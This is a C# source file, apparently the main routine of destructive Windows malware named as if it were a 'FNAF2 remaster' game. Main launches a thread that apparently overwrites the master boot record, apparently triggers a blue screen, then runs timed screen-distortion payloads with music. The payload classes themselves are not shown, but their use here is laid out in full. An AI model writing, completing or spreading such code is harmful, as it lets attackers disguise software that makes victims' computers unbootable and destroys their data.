using NAudio.Wave;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Linq.Expressions;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FNAF2_REMASTER
{
    public class Program
    {
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        public static void clear_screen()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }
        public static void Main(string[] args)
        {
            var som1 = new Beat1();
            var wave1 = new WaveOut();

            var som2 = new Beat2();
            var wave2 = new WaveOut();

            var som3 = new Beat3();
            var wave3 = new WaveOut();

            var som4 = new Beat4();
            var wave4 = new WaveOut();

            Thread mbr = new Thread(Mbr.Overwrite);
            mbr.Start();

            Cargas.bsod_start();

            Thread gd1 = new Thread(Cargas.Pay1);
            Thread gd2 = new Thread(Cargas.SpawnIco);
            Thread gd3 = new Thread(Cargas.Pay2);
            Thread gd4 = new Thread(Cargas.Pay3);

            Thread gd1_1 = new Thread(Cargas2.ColorRipple);
            Thread gdBuracone = new Thread(BuraconegroCarga.VishZe);

            Thread sound = new Thread(Sound.SonsDoSistemaIcons);

            wave1.Init(som1);
            wave1.Play();
            gd1.Start();

            Thread.Sleep(1000 * 10); // 10S

            wave1.Stop();
            sound.Start();

            gd1.Abort();

            clear_screen();

            gd2.Start();
            gd3.Start();

            Thread.Sleep(1000);

            wave2.Init(som2);
            wave2.Play();

            Thread.Sleep(1000 * 10); // 10S

            clear_screen();
            wave2.Stop();

            gd2.Abort();
            gd3.Abort();
            sound.Abort();

            wave3.Init(som3);
            wave3.Play();

            gd4.Start();


            Thread.Sleep(1000 * 10); // 10S


            clear_screen();

            gd4.Abort();

            gd1_1.Start();

            Thread.Sleep(1000 * 10); // 10S

            wave4.Init(som4);
            wave4.Play();

            clear_screen();
            gd1_1.Abort();
            gdBuracone.Start();


            Thread.Sleep(-1);
        }
    }
}
